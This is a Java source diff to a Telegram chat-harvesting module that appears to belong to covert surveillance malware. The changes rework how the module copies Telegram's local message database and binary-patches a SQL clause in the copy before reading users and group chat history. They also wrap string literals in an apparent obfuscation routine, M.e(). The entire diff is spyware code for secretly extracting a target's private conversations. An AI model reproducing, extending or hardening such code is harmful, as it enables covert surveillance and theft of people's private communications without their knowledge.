@@ -27,6 +27,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.RandomAccessFile;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.MappedByteBuffer;
@@ -219,18 +220,19 @@ public class ChatTelegram extends SubModuleChat {
 
 	}
 
-	public static boolean truncatedEquals(byte[] x, int start, byte[] y) {
-		int upperBound = Math.min(x.length - start, y.length);
+	public static int truncatedEquals(byte[] buffer, byte[] pattern,int start,int offset) {
+
+		int upperBound = Math.min(buffer.length - start, pattern.length - offset);
 		for (int i = 0; i < upperBound; i++) {
-			if (x[i + start] != y[i]) {
-				return false;
+			if (buffer[i + start] != pattern[i + (offset)]) {
+				return i;
 			}
 		}
-		return true;
+		return upperBound;
 	}
 
 	private synchronized GenericSqliteHelper openCopy(String dbFile) {
-		byte[] buf = new byte[1024 * 10];
+		byte[] buf = new byte[1024 * 20];
 
 		String matchString = M.e("WHERE mid < 0 AND send_state = 1");
 		byte[] match = EncodingUtils.getAsciiBytes(matchString);
@@ -253,27 +255,40 @@ public class ChatTelegram extends SubModuleChat {
 
 		String localFile = Path.markup() + fs.getName();
 		File local = new File(localFile);
-		try {
-			InputStream in = new FileInputStream(new File(dbFile));
-			OutputStream out = new FileOutputStream(local);
 
-			// Transfer bytes from in to out
-			int len;
+
+		try {
+			RandomAccessFile rafs = new RandomAccessFile(fs.getAbsoluteFile(), M.e("r"));
+			RandomAccessFile raf = new RandomAccessFile(local.getAbsoluteFile(), M.e("rw"));
+			int len,prevMatch=0,actualMatch,sizeToMatch=matchString.length();
 			boolean found = false;
-			while ((len = in.read(buf)) > 0) {
-				for(int i = 0; i< len; i++){
-					if( !found && truncatedEquals(buf, i, match )){
-						System.arraycopy(replace, 0 , buf, i, replace.length);
-						found = true;
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (openCopy), found binary at position: " + i);
-						}
+			long offsetOfNextOffset= rafs.getFilePointer();
+			while (!found && (len = rafs.read(buf)) > 0 ) {
+				for(int i = 0; !found && i< len ; i++){
+					actualMatch=truncatedEquals(buf, match ,i,prevMatch);
+					if(((actualMatch+prevMatch)==sizeToMatch)){
+						offsetOfNextOffset-=prevMatch;
+						raf.seek(offsetOfNextOffset+i);
+						raf.write(replace);
+						rafs.seek(offsetOfNextOffset+i+replace.length);
+						found=true;
+						break;
+					}
+					if(actualMatch>0){
+						prevMatch=actualMatch;
+						i+=actualMatch;
+					}else{
+						prevMatch=0;
 					}
 				}
-				out.write(buf, 0, len);
+				if(!found) {
+					raf.write(buf, 0, len);
+				}
+				offsetOfNextOffset+=len;
 			}
-			in.close();
-			out.close();
+			rafs.close();
+			raf.close();
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (openCopy), error: " + e);
@@ -312,7 +327,7 @@ public class ChatTelegram extends SubModuleChat {
 				}
 			};
 
-			helper.traverseRecords("users", visitor);
+			helper.traverseRecords(M.e("users"), visitor);
 		}
 
 		return account;
@@ -435,7 +450,7 @@ public class ChatTelegram extends SubModuleChat {
 	}
 
 	private long readTelegramGroupChatHistory(GenericSqliteHelper helper) {
-		RecordHashPairVisitor users = new RecordHashPairVisitor("uid", "name");
+		RecordHashPairVisitor users = new RecordHashPairVisitor(M.e("uid"), M.e("name"));
 		helper.traverseRecords("users", users);
 		final ChatGroups groups = new ChatGroups();
 		List<TelegramConversation> conversations = getTelegramGroups(helper, users, groups);
@@ -678,7 +693,7 @@ public class ChatTelegram extends SubModuleChat {
 				in.get();
 				i++;
 			}
-			return new String(b, "UTF-8");
+			return new String(b, M.e("UTF-8"));
 		} catch (Exception x) {
 
 		}
